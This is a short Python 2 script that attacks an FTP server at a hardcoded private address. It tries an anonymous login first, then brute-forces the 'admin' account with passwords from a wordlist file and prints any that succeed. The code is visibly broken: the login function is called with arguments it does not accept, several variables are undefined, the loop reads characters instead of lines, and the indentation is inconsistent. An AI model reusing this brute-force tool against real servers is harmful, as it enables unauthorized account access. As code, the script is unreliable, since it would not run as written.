import ftplib


def connect():
	try:
		ftp = ftplib.FTP(host)
		ftp.login(username,password)
		ftp.quit()
		return True
	except:
		return False	

def mainthree():
	# Variable
	targethostaddr = '10.3.3.2'
	usrname = 'admin'
	passfilepath = 'pass.txt'
	# Try to coonect to ftp client using anun cred
	print '=> Using Anonumous Credntials for ' + targethostaddr
	if connect(targethostaddr,'anonymous','tes t@test.com'):
		pass
	else:
		print '=> FTP Log failed on host '	+ targethostaddr

		# Try brute force

		passwordfile = open(passfilepath,'r')

		for line in passwordfile.readline():
			# cleqan the lines
			password = line.strip('\r').strip('\n')
			print "Testing >>" + str(password)

			if connect(targethostaddr,usrname,password):
				print "=> LOGIN successful on host " + targethostaddr + "with username " + username + "with password" + password
				exit(0)
 			else:
 				print "=> login failed on host " + targethostaddr + "username" + username
 


if __name__ == '__main__':
	mainthree()
